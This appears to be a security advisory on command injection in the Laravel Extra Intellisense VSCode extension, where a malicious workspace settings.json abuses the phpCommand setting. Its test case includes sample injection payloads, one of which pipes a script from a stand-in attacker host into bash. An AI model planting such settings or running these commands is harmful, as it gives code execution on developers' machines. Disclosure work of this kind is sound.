# Vulnerabilities in Laravel Extra Intellisense

## 1. Command Injection via User-Configurable PHP Command

### Description
The Laravel Extra Intellisense extension allows users to configure a custom command to execute PHP code via the `LaravelExtraIntellisense.phpCommand` setting. This setting is used directly in command execution without proper validation or sanitization. An attacker can craft a malicious workspace or settings.json file with a command injection payload in this configuration setting.

When the extension executes PHP code to fetch Laravel application data (routes, views, models, etc.), it uses the Node.js `child_process.exec()` method with the user-configured command template. The extension replaces `{code}` in the template with escaped PHP code, but doesn't validate the template itself, allowing arbitrary command injection.

### Impact
Critical - This vulnerability can lead to remote code execution on the system running VSCode with this extension. An attacker can execute arbitrary commands with the privileges of the user running VSCode, potentially leading to:
- System compromise
- Data theft
- Installation of malware
- Lateral movement within networks

### Currently Implemented Mitigations
The extension properly escapes quotes and special characters in the PHP code it generates, and includes a security warning in the README advising users to read the security note before using the extension.

### Missing Mitigations
- No validation of the `phpCommand` setting to ensure it only contains the expected structure and doesn't include malicious commands
- No use of safer execution alternatives like `execFile()` instead of `exec()`
- No sandboxing or restriction of the executed commands

### Preconditions
- The victim must have the Laravel Extra Intellisense extension installed
- The victim must open a project containing a malicious settings.json file or apply malicious settings

### Source Code Analysis
The vulnerability exists in the `runPhp` method in `helpers.ts`:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    // Code escaping happens here for the PHP code itself
    code = code.replace(/\"/g, "\\\"");
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }

    // The vulnerable part: user-controlled command template is used directly
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);

    // Command is executed without validation
    let out = new Promise<string>(function (resolve, error) {
        cp.exec(command, {
            cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0
                ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined
            },
            function (err, stdout, stderr) {
                // ...
            }
        );
    });
    return out;
}
```

This method is called from various provider classes like `RouteProvider`, `ViewProvider`, `ConfigProvider`, etc., whenever the extension needs to fetch data from the Laravel application. The command execution occurs automatically when the extension loads and periodically to refresh data.

### Security Test Case
To verify this vulnerability:

1. Create a test Laravel project
2. Create a `.vscode/settings.json` file with the following content:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & echo 'Arbitrary command execution' > /tmp/vscode-laravel-exploit.txt"
   }
   ```
3. Open the project in VSCode with the Laravel Extra Intellisense extension installed
4. Wait for the extension to activate and run its data collection
5. Check if the file `/tmp/vscode-laravel-exploit.txt` was created, which would confirm command injection occurred

For a more sophisticated attack, the payload could be:
```json
{
  "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\" & curl -s http://attacker.com/payload.sh | bash"
}
```

This would execute the PHP code as intended but also download and run a malicious script from an attacker-controlled server.
